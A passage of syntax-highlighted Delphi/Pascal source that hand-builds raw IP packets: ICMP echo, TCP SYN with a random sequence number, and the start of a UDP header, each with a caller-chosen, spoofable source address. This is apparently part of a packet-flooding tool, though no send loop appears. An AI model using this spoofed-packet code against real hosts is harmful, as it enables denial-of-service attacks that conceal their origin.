  </span><span class="sc11">ipHdr.ip_verlen</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc4">4</span><span class="sc0"> </span><span class="sc5">shl</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">ipHdr</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">div</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">longword</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_tos</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_len</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">Size</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_id</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_offset</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_ttl</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">128</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_protocol</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_checksum</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_saddr</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">inet_addr</span><span class="sc10">(</span><span class="sc11">pchar</span><span class="sc10">(</span><span class="sc11">FromIP</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_daddr</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">inet_addr</span><span class="sc10">(</span><span class="sc11">pchar</span><span class="sc10">(</span><span class="sc11">ToIP</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">icmpHdr.ih_type</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">icmpHdr.ih_code</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">icmpHdr.ih_checksum</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">icmpHdr.ih_id</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">icmpHdr.ih_seq</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">DataPointer</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> @</span><span class="sc11">Buffer</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc11">FillChar</span><span class="sc10">(</span><span class="sc11">Buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SizeOf</span><span class="sc10">(</span><span class="sc11">Buffer</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">icmpHdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DataPointer</span><span class="sc10">^,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">icmpHdr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">IncPtr</span><span class="sc10">(</span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">icmpHdr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">icmpHdr</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">Data</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">DataPointer</span><span class="sc10">^,</span><span class="sc0"> </span><span class="sc11">length</span><span class="sc10">(</span><span class="sc11">Data</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">IncPtr</span><span class="sc10">(</span><span class="sc11">length</span><span class="sc10">(</span><span class="sc11">Data</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">length</span><span class="sc10">(</span><span class="sc11">Data</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">icmpHdr.ih_checksum</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">CheckSum</span><span class="sc10">(</span><span class="sc11">Buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ChecksumSize</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">FillChar</span><span class="sc10">(</span><span class="sc11">Buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">Buffer</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">DataPointer</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> @</span><span class="sc11">Buffer</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">ipHdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DataPointer</span><span class="sc10">^,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">ipHdr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">IncPtr</span><span class="sc10">(</span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">ipHdr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">icmpHdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DataPointer</span><span class="sc10">^,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">icmpHdr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">IncPtr</span><span class="sc10">(</span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">icmpHdr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">Data</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">DataPointer</span><span class="sc10">^,</span><span class="sc0"> </span><span class="sc11">length</span><span class="sc10">(</span><span class="sc11">Data</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">Socket.sin_family</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">Socket.sin_port</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Socket.sin_addr.saddr</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">inet_addr</span><span class="sc10">(</span><span class="sc11">pchar</span><span class="sc10">(</span><span class="sc11">ToIP</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">SYNHeader</span><span class="sc10">(</span><span class="sc11">FromIP</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">FromPort</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">ToIP</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">ToPort</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">Buffer</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">TBufferArray</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">Socket</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">TSockAddr</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">Size</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">var</span><span class="sc0">
  </span><span class="sc11">ipHdr</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">iph</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">tcpHdr</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">tcph</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">TcpHeaderLen</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">ChecksumSize</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">DataPointer</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc10">^</span><span class="sc11">byte</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">IncPtr</span><span class="sc10">(</span><span class="sc11">Value</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">begin</span><span class="sc0">
    </span><span class="sc11">DataPointer</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">pointer</span><span class="sc10">(</span><span class="sc11">integer</span><span class="sc10">(</span><span class="sc11">DataPointer</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Value</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">begin</span><span class="sc0">
  </span><span class="sc11">Size</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">ipHdr</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">tcpHdr</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_verlen</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc4">4</span><span class="sc0"> </span><span class="sc5">shl</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">ipHdr</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">div</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">longword</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_tos</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_len</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">Size</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_id</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_offset</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_ttl</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">128</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_protocol</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_checksum</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_saddr</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">inet_addr</span><span class="sc10">(</span><span class="sc11">pchar</span><span class="sc10">(</span><span class="sc11">FromIP</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_daddr</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">inet_addr</span><span class="sc10">(</span><span class="sc11">pchar</span><span class="sc10">(</span><span class="sc11">ToIP</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">tcpHdr.th_sport</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">FromPort</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">tcpHdr.th_dport</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">ToPort</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">tcpHdr.th_seq</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">(</span><span class="sc4">4294967295</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">tcpHdr.th_ack</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">tcpHdr.th_len</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">80</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">tcpHdr.th_flags</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">tcpHdr.th_win</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc4">65535</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">tcpHdr.th_checksum</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">tcpHdr.th_upr</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">DataPointer</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> @</span><span class="sc11">Buffer</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc11">FillChar</span><span class="sc10">(</span><span class="sc11">Buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SizeOf</span><span class="sc10">(</span><span class="sc11">Buffer</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">ipHdr.ip_saddr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DataPointer</span><span class="sc10">^,</span><span class="sc0"> </span><span class="sc11">SizeOf</span><span class="sc10">(</span><span class="sc11">ipHdr.ip_saddr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">IncPtr</span><span class="sc10">(</span><span class="sc11">SizeOf</span><span class="sc10">(</span><span class="sc11">ipHdr.ip_saddr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">ipHdr.ip_saddr</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">ipHdr.ip_daddr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DataPointer</span><span class="sc10">^,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">ipHdr.ip_daddr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">IncPtr</span><span class="sc10">(</span><span class="sc11">SizeOf</span><span class="sc10">(</span><span class="sc11">ipHdr.ip_daddr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">ipHdr.ip_daddr</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">IncPtr</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Inc</span><span class="sc10">(</span><span class="sc11">ChecksumSize</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">ipHdr.ip_protocol</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DataPointer</span><span class="sc10">^,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">ipHdr.ip_protocol</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">IncPtr</span><span class="sc10">(</span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">ipHdr.ip_protocol</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">ipHdr.ip_protocol</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">TcpHeaderLen</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">tcpHdr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">TcpHeaderLen</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DataPointer</span><span class="sc10">^,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">TcpHeaderLen</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">IncPtr</span><span class="sc10">(</span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">TcpHeaderLen</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">TcpHeaderLen</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">tcpHdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DataPointer</span><span class="sc10">^,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">tcpHdr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">IncPtr</span><span class="sc10">(</span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">tcpHdr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">tcpHdr</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">tcpHdr.th_checksum</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">CheckSum</span><span class="sc10">(</span><span class="sc11">Buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ChecksumSize</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">FillChar</span><span class="sc10">(</span><span class="sc11">Buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">Buffer</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">DataPointer</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> @</span><span class="sc11">Buffer</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">ipHdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DataPointer</span><span class="sc10">^,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">ipHdr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">IncPtr</span><span class="sc10">(</span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">ipHdr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">tcpHdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DataPointer</span><span class="sc10">^,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">tcpHdr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">Socket.sin_family</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">Socket.sin_port</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Socket.sin_addr.saddr</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">inet_addr</span><span class="sc10">(</span><span class="sc11">pchar</span><span class="sc10">(</span><span class="sc11">ToIP</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">UDPHeader</span><span class="sc10">(</span><span class="sc11">FromIP</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">FromPort</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">ToIP</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">ToPort</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">Data</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">Buffer</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">TBufferArray</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">Socket</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">TSockAddr</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">Size</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">var</span><span class="sc0">
  </span><span class="sc11">ipHdr</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">iph</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">udpHdr</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">udph</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">ChecksumSize</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">DataPointer</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc10">^</span><span class="sc11">byte</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">IncPtr</span><span class="sc10">(</span><span class="sc11">Value</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">begin</span><span class="sc0">
    </span><span class="sc11">DataPointer</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">pointer</span><span class="sc10">(</span><span class="sc11">integer</span><span class="sc10">(</span><span class="sc11">DataPointer</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Value</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">begin</span><span class="sc0">
  </span><span class="sc11">Size</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">ipHdr</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">udpHdr</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">length</span><span class="sc10">(</span><span class="sc11">Data</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_verlen</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc4">4</span><span class="sc0"> </span><span class="sc5">shl</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">ipHdr</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">div</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">longword</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_tos</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_len</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">Size</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_id</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_offset</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_ttl</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">128</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_protocol</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">17</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_checksum</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_saddr</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">inet_addr</span><span class="sc10">(</span><span class="sc11">pchar</span><span class="sc10">(</span><span class="sc11">FromIP</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">ipHdr.ip_daddr</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">inet_addr</span><span class="sc10">(</span><span class="sc11">pchar</span><span class="sc10">(</span><span class="sc11">ToIP</span><span class="sc10">));</span><span class="sc0">
